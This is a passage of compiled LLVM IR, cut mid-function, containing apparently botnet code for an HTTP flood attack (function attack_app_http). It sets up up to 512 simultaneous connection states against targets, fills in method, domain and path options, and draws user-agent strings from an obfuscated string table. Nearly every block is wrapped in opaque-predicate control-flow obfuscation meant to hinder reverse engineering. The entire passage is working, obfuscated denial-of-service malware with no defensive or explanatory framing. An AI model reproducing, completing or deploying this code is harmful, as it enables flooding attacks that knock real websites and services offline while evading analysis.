  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %38

; <label>:38:                                     ; preds = %originalBBpart2, %17
  %39 = load i32, i32* @x.15
  %40 = load i32, i32* @y.16
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %38
  %47 = load i32, i32* %5, align 4
  %48 = load i32, i32* @x.15
  %49 = load i32, i32* @y.16
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %47

originalBBalteredBB:                              ; preds = %originalBB, %19
  %56 = load i8*, i8** %10, align 8
  %57 = call i32 @inet_addr(i8* %56) #6
  store i32 %57, i32* %5, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %38
  %58 = load i32, i32* %5, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_http_state*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i16, align 2
  %20 = alloca [10241 x i8], align 16
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.fd_set, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.timeval, align 8
  %26 = alloca %struct.attack_http_state*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.sockaddr_in, align 4
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %34 = alloca [10240 x i8], align 16
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i32, align 4
  %49 = alloca i8*, align 8
  %50 = alloca i32, align 4
  %51 = alloca i32, align 4
  %52 = alloca i32, align 4
  %53 = alloca i32, align 4
  %54 = alloca i8*, align 8
  %55 = alloca i32, align 4
  %56 = alloca i32, align 4
  %57 = alloca i8*, align 8
  %58 = alloca i32, align 4
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  %61 = alloca i32, align 4
  %62 = alloca i32, align 4
  %63 = alloca i32, align 4
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  store i32 0, i32* %12, align 4
  store %struct.attack_http_state* null, %struct.attack_http_state** %13, align 8
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i8* @attack_get_opt_str(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 20, i8* null)
  store i8* %66, i8** %14, align 8
  %67 = load i8, i8* %7, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = call i8* @attack_get_opt_str(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 19, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  store i8* %69, i8** %15, align 8
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i8* @attack_get_opt_str(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 8, i8* null)
  store i8* %72, i8** %16, align 8
  %73 = load i8, i8* %7, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %75 = call i8* @attack_get_opt_str(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 21, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i32 0, i32 0))
  store i8* %75, i8** %17, align 8
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 23, i32 1)
  store i32 %78, i32* %18, align 4
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 7, i32 80)
  %82 = trunc i32 %81 to i16
  store i16 %82, i16* %19, align 2
  %83 = bitcast [10241 x i8]* %20 to i8*
  call void @llvm.memset.p0i8.i64(i8* %83, i8 0, i64 10241, i32 16, i1 false)
  %84 = load i8*, i8** %16, align 8
  %85 = icmp eq i8* %84, null
  br i1 %85, label %105, label %86

; <label>:86:                                     ; preds = %4
  %87 = load i32, i32* @x.17
  %88 = load i32, i32* @y.18
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %86
  %95 = load i8*, i8** %17, align 8
  %96 = icmp eq i8* %95, null
  %97 = load i32, i32* @x.17
  %98 = load i32, i32* @y.18
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %96, label %105, label %106

; <label>:105:                                    ; preds = %originalBBpart2, %4
  br label %4237

; <label>:106:                                    ; preds = %originalBBpart2
  %107 = load i8*, i8** %17, align 8
  %108 = call i32 @util_strlen(i8* %107)
  %109 = icmp sgt i32 %108, 255
  br i1 %109, label %110, label %127

; <label>:110:                                    ; preds = %106
  %111 = load i32, i32* @x.17
  %112 = load i32, i32* @y.18
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %110
  %119 = load i32, i32* @x.17
  %120 = load i32, i32* @y.18
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %4237

; <label>:127:                                    ; preds = %106
  %128 = load i32, i32* @x.17
  %129 = load i32, i32* @y.18
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %127
  %136 = load i8*, i8** %16, align 8
  %137 = call i32 @util_strlen(i8* %136)
  %138 = icmp sgt i32 %137, 127
  %139 = load i32, i32* @x.17
  %140 = load i32, i32* @y.18
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %138, label %147, label %148

; <label>:147:                                    ; preds = %originalBBpart28
  br label %4237

; <label>:148:                                    ; preds = %originalBBpart28
  %149 = load i32, i32* @x.17
  %150 = load i32, i32* @y.18
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %148
  %157 = load i8*, i8** %15, align 8
  %158 = call i32 @util_strlen(i8* %157)
  %159 = icmp sgt i32 %158, 9
  %160 = load i32, i32* @x.17
  %161 = load i32, i32* @y.18
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %159, label %168, label %185

; <label>:168:                                    ; preds = %originalBBpart212
  %169 = load i32, i32* @x.17
  %170 = load i32, i32* @y.18
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %168
  %177 = load i32, i32* @x.17
  %178 = load i32, i32* @y.18
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %4237

; <label>:185:                                    ; preds = %originalBBpart212
  store i32 0, i32* %10, align 4
  br label %186

; <label>:186:                                    ; preds = %249, %185
  %187 = load i32, i32* @x.17
  %188 = load i32, i32* @y.18
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %186
  %195 = load i32, i32* %10, align 4
  %196 = load i8*, i8** %15, align 8
  %197 = call i32 @util_strlen(i8* %196)
  %198 = icmp slt i32 %195, %197
  %199 = load i32, i32* @x.17
  %200 = load i32, i32* @y.18
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %198, label %207, label %252

; <label>:207:                                    ; preds = %originalBBpart220
  %208 = load i32, i32* @x.17
  %209 = load i32, i32* @y.18
  %210 = sub i32 %208, 1
  %211 = mul i32 %208, %210
  %212 = urem i32 %211, 2
  %213 = icmp eq i32 %212, 0
  %214 = icmp slt i32 %209, 10
  %215 = or i1 %213, %214
  br i1 %215, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %207
  %216 = load i8*, i8** %15, align 8
  %217 = load i32, i32* %10, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds i8, i8* %216, i64 %218
  %220 = load i8, i8* %219, align 1
  %221 = sext i8 %220 to i32
  %222 = icmp sge i32 %221, 97
  %223 = load i32, i32* @x.17
  %224 = load i32, i32* @y.18
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %222, label %231, label %248

; <label>:231:                                    ; preds = %originalBBpart224
  %232 = load i8*, i8** %15, align 8
  %233 = load i32, i32* %10, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds i8, i8* %232, i64 %234
  %236 = load i8, i8* %235, align 1
  %237 = sext i8 %236 to i32
  %238 = icmp sle i32 %237, 122
  br i1 %238, label %239, label %248

; <label>:239:                                    ; preds = %231
  %240 = load i8*, i8** %15, align 8
  %241 = load i32, i32* %10, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds i8, i8* %240, i64 %242
  %244 = load i8, i8* %243, align 1
  %245 = sext i8 %244 to i32
  %246 = sub nsw i32 %245, 32
  %247 = trunc i32 %246 to i8
  store i8 %247, i8* %243, align 1
  br label %248

; <label>:248:                                    ; preds = %239, %231, %originalBBpart224
  br label %249

; <label>:249:                                    ; preds = %248
  %250 = load i32, i32* %10, align 4
  %251 = add nsw i32 %250, 1
  store i32 %251, i32* %10, align 4
  br label %186

; <label>:252:                                    ; preds = %originalBBpart220
  %253 = load i32, i32* @x.17
  %254 = load i32, i32* @y.18
  %255 = sub i32 %253, 1
  %256 = mul i32 %253, %255
  %257 = urem i32 %256, 2
  %258 = icmp eq i32 %257, 0
  %259 = icmp slt i32 %254, 10
  %260 = or i1 %258, %259
  br i1 %260, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %252
  %261 = load i32, i32* %18, align 4
  %262 = icmp sgt i32 %261, 512
  %263 = load i32, i32* @x.17
  %264 = load i32, i32* @y.18
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %262, label %271, label %272

; <label>:271:                                    ; preds = %originalBBpart228
  store i32 512, i32* %18, align 4
  br label %272

; <label>:272:                                    ; preds = %271, %originalBBpart228
  call void @table_unlock_val(i8 zeroext 43)
  call void @table_unlock_val(i8 zeroext 44)
  call void @table_unlock_val(i8 zeroext 45)
  call void @table_unlock_val(i8 zeroext 46)
  call void @table_unlock_val(i8 zeroext 47)
  call void @table_unlock_val(i8 zeroext 48)
  call void @table_unlock_val(i8 zeroext 49)
  call void @table_unlock_val(i8 zeroext 50)
  call void @table_unlock_val(i8 zeroext 51)
  call void @table_unlock_val(i8 zeroext 52)
  call void @table_unlock_val(i8 zeroext 53)
  %273 = load i32, i32* %18, align 4
  %274 = sext i32 %273 to i64
  %275 = call noalias i8* @calloc(i64 %274, i64 3140) #6
  %276 = bitcast i8* %275 to %struct.attack_http_state*
  store %struct.attack_http_state* %276, %struct.attack_http_state** %13, align 8
  store i32 0, i32* %9, align 4
  br label %277

; <label>:277:                                    ; preds = %570, %272
  %278 = load i32, i32* @x.17
  %279 = load i32, i32* @y.18
  %280 = sub i32 %278, 1
  %281 = mul i32 %278, %280
  %282 = urem i32 %281, 2
  %283 = icmp eq i32 %282, 0
  %284 = icmp slt i32 %279, 10
  %285 = or i1 %283, %284
  br i1 %285, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %277
  %286 = load i32, i32* %9, align 4
  %287 = load i32, i32* %18, align 4
  %288 = icmp slt i32 %286, %287
  %289 = load i32, i32* @x.17
  %290 = load i32, i32* @y.18
  %291 = sub i32 %289, 1
  %292 = mul i32 %289, %291
  %293 = urem i32 %292, 2
  %294 = icmp eq i32 %293, 0
  %295 = icmp slt i32 %290, 10
  %296 = or i1 %294, %295
  br i1 %296, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %288, label %297, label %573

; <label>:297:                                    ; preds = %originalBBpart232
  %298 = load i32, i32* @x.17
  %299 = load i32, i32* @y.18
  %300 = sub i32 %298, 1
  %301 = mul i32 %298, %300
  %302 = urem i32 %301, 2
  %303 = icmp eq i32 %302, 0
  %304 = icmp slt i32 %299, 10
  %305 = or i1 %303, %304
  br i1 %305, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %297
  %306 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %307 = load i32, i32* %9, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %306, i64 %308
  %310 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %309, i32 0, i32 1
  store i8 0, i8* %310, align 4
  %311 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %314, i32 0, i32 0
  store i32 -1, i32* %315, align 4
  %316 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %317 = load i32, i32* %9, align 4
  %318 = load i8, i8* %5, align 1
  %319 = zext i8 %318 to i32
  %320 = srem i32 %317, %319
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %316, i64 %321
  %323 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %322, i32 0, i32 1
  %324 = load i32, i32* %323, align 4
  %325 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %326 = load i32, i32* %9, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %325, i64 %327
  %329 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %328, i32 0, i32 4
  store i32 %324, i32* %329, align 4
  %330 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %331 = load i32, i32* %9, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %330, i64 %332
  %334 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %333, i32 0, i32 6
  %335 = getelementptr inbounds [257 x i8], [257 x i8]* %334, i32 0, i32 0
  %336 = load i8*, i8** %17, align 8
  %337 = call i32 @util_strcpy(i8* %335, i8* %336)
  %338 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %339 = load i32, i32* %9, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %338, i64 %340
  %342 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %341, i32 0, i32 6
  %343 = getelementptr inbounds [257 x i8], [257 x i8]* %342, i64 0, i64 0
  %344 = load i8, i8* %343, align 4
  %345 = sext i8 %344 to i32
  %346 = icmp ne i32 %345, 47
  %347 = load i32, i32* @x.17
  %348 = load i32, i32* @y.18
  %349 = sub i32 %347, 1
  %350 = mul i32 %347, %349
  %351 = urem i32 %350, 2
  %352 = icmp eq i32 %351, 0
  %353 = icmp slt i32 %348, 10
  %354 = or i1 %352, %353
  br i1 %354, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %346, label %355, label %383

; <label>:355:                                    ; preds = %originalBBpart236
  %356 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %357 = load i32, i32* %9, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %356, i64 %358
  %360 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %359, i32 0, i32 6
  %361 = getelementptr inbounds [257 x i8], [257 x i8]* %360, i32 0, i32 0
  %362 = getelementptr inbounds i8, i8* %361, i64 1
  %363 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %364 = load i32, i32* %9, align 4
  %365 = sext i32 %364 to i64
  %366 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %363, i64 %365
  %367 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %366, i32 0, i32 6
  %368 = getelementptr inbounds [257 x i8], [257 x i8]* %367, i32 0, i32 0
  %369 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %370 = load i32, i32* %9, align 4
  %371 = sext i32 %370 to i64
  %372 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %369, i64 %371
  %373 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %372, i32 0, i32 6
  %374 = getelementptr inbounds [257 x i8], [257 x i8]* %373, i32 0, i32 0
  %375 = call i32 @util_strlen(i8* %374)
  %376 = sext i32 %375 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %362, i8* %368, i64 %376, i32 1, i1 false)
  %377 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %378 = load i32, i32* %9, align 4
  %379 = sext i32 %378 to i64
  %380 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %377, i64 %379
  %381 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %380, i32 0, i32 6
  %382 = getelementptr inbounds [257 x i8], [257 x i8]* %381, i64 0, i64 0
  store i8 47, i8* %382, align 4
  br label %383

; <label>:383:                                    ; preds = %355, %originalBBpart236
  %384 = load i32, i32* @x.17
  %385 = load i32, i32* @y.18
  %386 = sub i32 %384, 1
  %387 = mul i32 %384, %386
  %388 = urem i32 %387, 2
  %389 = icmp eq i32 %388, 0
  %390 = icmp slt i32 %385, 10
  %391 = or i1 %389, %390
  br i1 %391, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %383
  %392 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %393 = load i32, i32* %9, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %392, i64 %394
  %396 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %395, i32 0, i32 10
  %397 = getelementptr inbounds [9 x i8], [9 x i8]* %396, i32 0, i32 0
  %398 = load i8*, i8** %15, align 8
  %399 = call i32 @util_strcpy(i8* %397, i8* %398)
  %400 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %401 = load i32, i32* %9, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %400, i64 %402
  %404 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %403, i32 0, i32 9
  %405 = getelementptr inbounds [9 x i8], [9 x i8]* %404, i32 0, i32 0
  %406 = load i8*, i8** %15, align 8
  %407 = call i32 @util_strcpy(i8* %405, i8* %406)
  %408 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %409 = load i32, i32* %9, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %408, i64 %410
  %412 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %411, i32 0, i32 7
  %413 = getelementptr inbounds [129 x i8], [129 x i8]* %412, i32 0, i32 0
  %414 = load i8*, i8** %16, align 8
  %415 = call i32 @util_strcpy(i8* %413, i8* %414)
  %416 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %417 = load i32, i32* %9, align 4
  %418 = load i8, i8* %5, align 1
  %419 = zext i8 %418 to i32
  %420 = srem i32 %417, %419
  %421 = sext i32 %420 to i64
  %422 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %416, i64 %421
  %423 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %422, i32 0, i32 2
  %424 = load i8, i8* %423, align 4
  %425 = zext i8 %424 to i32
  %426 = icmp slt i32 %425, 32
  %427 = load i32, i32* @x.17
  %428 = load i32, i32* @y.18
  %429 = sub i32 %427, 1
  %430 = mul i32 %427, %429
  %431 = urem i32 %430, 2
  %432 = icmp eq i32 %431, 0
  %433 = icmp slt i32 %428, 10
  %434 = or i1 %432, %433
  br i1 %434, label %originalBBpart244, label %originalBB38alteredBB

originalBBpart244:                                ; preds = %originalBB38
  br i1 %426, label %435, label %465

; <label>:435:                                    ; preds = %originalBBpart244
  %436 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %437 = load i32, i32* %9, align 4
  %438 = load i8, i8* %5, align 1
  %439 = zext i8 %438 to i32
  %440 = srem i32 %437, %439
  %441 = sext i32 %440 to i64
  %442 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %436, i64 %441
  %443 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %442, i32 0, i32 1
  %444 = load i32, i32* %443, align 4
  %445 = call i32 @ntohl(i32 %444) #7
  %446 = call i32 @rand_next()
  %447 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %448 = load i32, i32* %9, align 4
  %449 = load i8, i8* %5, align 1
  %450 = zext i8 %449 to i32
  %451 = srem i32 %448, %450
  %452 = sext i32 %451 to i64
  %453 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %447, i64 %452
  %454 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %453, i32 0, i32 2
  %455 = load i8, i8* %454, align 4
  %456 = zext i8 %455 to i32
  %457 = lshr i32 %446, %456
  %458 = add i32 %445, %457
  %459 = call i32 @htonl(i32 %458) #7
  %460 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %461 = load i32, i32* %9, align 4
  %462 = sext i32 %461 to i64
  %463 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %460, i64 %462
  %464 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %463, i32 0, i32 4
  store i32 %459, i32* %464, align 4
  br label %465

; <label>:465:                                    ; preds = %435, %originalBBpart244
  %466 = call i32 @rand_next()
  %467 = urem i32 %466, 5
  switch i32 %467, label %545 [
    i32 0, label %468
    i32 1, label %477
    i32 2, label %502
    i32 3, label %511
    i32 4, label %536
  ]

; <label>:468:                                    ; preds = %465
  call void @table_unlock_val(i8 zeroext 54)
  %469 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %470 = load i32, i32* %9, align 4
  %471 = sext i32 %470 to i64
  %472 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %469, i64 %471
  %473 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %472, i32 0, i32 5
  %474 = getelementptr inbounds [512 x i8], [512 x i8]* %473, i32 0, i32 0
  %475 = call i8* @table_retrieve_val(i32 54, i32* null)
  %476 = call i32 @util_strcpy(i8* %474, i8* %475)
  call void @table_lock_val(i8 zeroext 54)
  br label %545

; <label>:477:                                    ; preds = %465
  %478 = load i32, i32* @x.17
  %479 = load i32, i32* @y.18
  %480 = sub i32 %478, 1
  %481 = mul i32 %478, %480
  %482 = urem i32 %481, 2
  %483 = icmp eq i32 %482, 0
  %484 = icmp slt i32 %479, 10
  %485 = or i1 %483, %484
  br i1 %485, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %477
  call void @table_unlock_val(i8 zeroext 55)
  %486 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %487 = load i32, i32* %9, align 4
  %488 = sext i32 %487 to i64
  %489 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %486, i64 %488
  %490 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %489, i32 0, i32 5
  %491 = getelementptr inbounds [512 x i8], [512 x i8]* %490, i32 0, i32 0
  %492 = call i8* @table_retrieve_val(i32 55, i32* null)
  %493 = call i32 @util_strcpy(i8* %491, i8* %492)
  call void @table_lock_val(i8 zeroext 55)
  %494 = load i32, i32* @x.17
  %495 = load i32, i32* @y.18
  %496 = sub i32 %494, 1
  %497 = mul i32 %494, %496
  %498 = urem i32 %497, 2
  %499 = icmp eq i32 %498, 0
  %500 = icmp slt i32 %495, 10
  %501 = or i1 %499, %500
  br i1 %501, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %545

; <label>:502:                                    ; preds = %465
  call void @table_unlock_val(i8 zeroext 56)
  %503 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %504 = load i32, i32* %9, align 4
  %505 = sext i32 %504 to i64
  %506 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %503, i64 %505
  %507 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %506, i32 0, i32 5
  %508 = getelementptr inbounds [512 x i8], [512 x i8]* %507, i32 0, i32 0
  %509 = call i8* @table_retrieve_val(i32 56, i32* null)
  %510 = call i32 @util_strcpy(i8* %508, i8* %509)
  call void @table_lock_val(i8 zeroext 56)
  br label %545

; <label>:511:                                    ; preds = %465
  %512 = load i32, i32* @x.17
  %513 = load i32, i32* @y.18
  %514 = sub i32 %512, 1
  %515 = mul i32 %512, %514
  %516 = urem i32 %515, 2
  %517 = icmp eq i32 %516, 0
  %518 = icmp slt i32 %513, 10
  %519 = or i1 %517, %518
  br i1 %519, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %511
